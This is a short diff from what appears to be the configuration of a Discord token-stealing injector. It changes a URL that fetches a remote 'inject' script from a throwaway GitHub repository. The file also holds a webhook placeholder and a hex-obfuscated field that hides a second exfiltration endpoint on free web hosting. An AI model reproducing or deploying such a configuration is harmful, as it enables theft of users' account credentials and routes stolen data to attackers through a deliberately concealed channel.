@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/c44f7403e6a937507fe4106811938036e3a176ac/Mauricio-Inject?token=GHSAT0AAAAAAB7WQOFGKMHFFLN3LO4E423YZAHNQLQ",
+    injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/main/index.js?token=GHSAT0AAAAAAB7X7ZCBOKJDCBEWR4M6RG2WZAISPMQ",
     webhook: "%WEBHOOK%",
     uwu: "/x68/x74/x74/x70/x73/x3A/x2F/x2F/x68/x77/x69/x64/x77/x68/x69/x74/x65/x6C/x69/x73/x74/x6B/x65/x79/x2E/x30/x30/x30/x77/x65/x62/x68/x6F/x73/x74/x61/x70/x70/x2E/x63/x6F/x6D/x2F/x44/x69/x73/x63/x6F/x72/x64/x57/x65/x62/x68/x6F/x6F/x6B/x73/x2E/x70/x68/x70",
     Filter: {
